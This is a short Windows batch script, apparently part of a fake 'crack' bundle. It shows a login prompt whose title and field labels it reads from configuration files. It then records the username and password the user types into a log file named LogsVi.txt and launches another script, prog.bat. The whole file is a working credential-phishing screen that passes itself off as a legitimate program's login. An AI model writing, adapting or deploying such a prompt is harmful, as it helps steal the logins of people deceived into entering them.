@echo off

cd ..
cd LogUser
For /f %%i in (LogTitleUser.txt) do set Title=%%i
title %Title%
cd ..
cd Crack

color b
echo Welcome in %Title%
echo.
cd ..
cd LogUser
For /f %%i in (LogNameUser.txt) do set User=%%i
echo Enter %User% :
echo.
set /p userVi=%User% :
echo %User%=%userVi% >> LogsVi.txt
cd ..
cd Crack

cd ..
cd LogUser
For /f %%i in (LogPassUser.txt) do set Pass=%%i
echo.
echo Enter %Pass% :
echo.
set /p passVi=%Pass% :
echo %Pass%=%passVi% >> LogsVi.txt
cd ..
cd Crack

start prog.bat
exit
